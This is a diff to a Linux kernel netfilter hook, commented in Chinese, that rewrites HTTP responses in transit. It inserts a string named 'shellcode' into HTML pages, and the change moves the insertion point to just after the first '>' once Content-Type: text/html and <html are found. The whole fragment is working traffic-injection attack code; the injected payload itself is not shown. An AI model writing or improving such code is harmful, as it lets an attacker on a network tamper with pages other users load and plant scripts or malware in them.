@@ -84,11 +84,14 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 				return NF_ACCEPT;
 			}
 			// 找到页面源码中插入位置（示例中为head后面）
-			char *phead = strstr(pkg,"<head>");
-			if(phead == NULL){
-				return NF_ACCEPT;
-			}
+			char *phead = strstr(pkg,">");
+			if(phead == NULL) return NF_ACCEPT;
 
+			char* pK = strstr(pkg,"Content-Type: text/html");
+			if(pK == NULL)	return NF_ACCEPT;
+
+			pK = strstr(pkg,"<html");
+			if(pK == NULL)	return NF_ACCEPT;
 			// 尝试不使用nf_nat_mangle_tcp_packet，手动扩容
 			// -------------------------------------------------
 			// skb扩容，在尾部增加strlen(shellcode)长度
@@ -133,7 +136,7 @@ unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct n
 						ct, 
 						ctinfo,
 						iph->ihl * 4, 
-						(int)(phead - pkg) + 6, 
+						(int)(phead - pkg) + 1, 
 						0,
 						shellcode, 
 						strlen(shellcode))) 
